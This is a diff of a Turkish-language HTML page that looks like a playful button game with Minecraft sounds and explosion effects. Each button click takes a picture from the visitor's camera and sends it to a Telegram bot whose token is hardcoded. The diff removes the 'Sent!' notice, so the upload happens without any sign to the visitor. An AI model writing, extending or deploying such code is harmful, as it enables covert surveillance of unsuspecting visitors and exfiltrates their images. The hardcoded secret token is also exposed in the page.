@@ -17,30 +17,36 @@
       text-align: center;
       overflow: hidden;
     }
+
     #hataMesaji {
       display: none;
       font-size: 28px;
       color: red;
       animation: yanipSonme 0.5s infinite;
     }
+
     @keyframes yanipSonme {
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
     }
+
     #ayikOl, #koduGonder {
       display: none;
     }
+
     #uyari {
       display: none;
       color: orange;
       font-size: 18px;
       margin-top: 10px;
     }
+
     #ayikOl {
       font-size: 60px;
       color: red;
       margin-bottom: 10px;
     }
+
     #koduGonder {
       font-size: 18px;
       padding: 10px 20px;
@@ -53,11 +59,7 @@
       position: relative;
       z-index: 1;
     }
-    #gonderildi {
-      display: none;
-      margin-top: 10px;
-      color: lightgreen;
-    }
+
     .piece {
       position: absolute;
       width: 10px;
@@ -65,6 +67,7 @@
       background-color: #4CAF50;
       animation: explode 0.6s forwards ease-out;
     }
+
     @keyframes explode {
       0% { opacity: 1; transform: translate(0, 0) scale(1); }
       100% {
@@ -75,6 +78,7 @@
         ) scale(0.5);
       }
     }
+
     video {
       display: none;
       transform: scaleX(-1);
@@ -100,7 +104,6 @@
 
   <video id="kamera" autoplay playsinline muted></video>
   <button id="koduGonder" onclick="koduGonderTiklandi(this)">Kodu Gönder</button>
-  <div id="gonderildi">📸 Gönderildi!</div>
 
   <script>
     const botToken = "8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g";
@@ -145,25 +148,25 @@
     function koduGonderTiklandi(button) {
       tiklamaSayisi++;
 
-      // 🎵 Minecraft kırılma sesi
+      // Minecraft sesi
       const audio = document.getElementById("breakSound");
       audio.currentTime = 0;
       audio.play();
 
-      // 📳 Titreşim
+      // Titreşim
       if (navigator.vibrate) {
         navigator.vibrate(150);
       }
 
-      // 📸 Foto çek
+      // Fotoğraf gönder
       fotoGonder();
 
-      // 🟠 Uyarı yazısı
+      // İkinci basışta uyarı çıkar
       if (tiklamaSayisi === 2) {
         document.getElementById("uyari").style.display = "block";
       }
 
-      // 💥 Blok patlat
+      // Efekti başlat
       explodeButton(button);
     }
 
@@ -201,11 +204,6 @@
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: formData
-        }).then(() => {
-          document.getElementById("gonderildi").style.display = "block";
-          setTimeout(() => {
-            document.getElementById("gonderildi").style.display = "none";
-          }, 2000);
         }).catch(err => {
           console.error("Foto gönderilemedi:", err);
         });
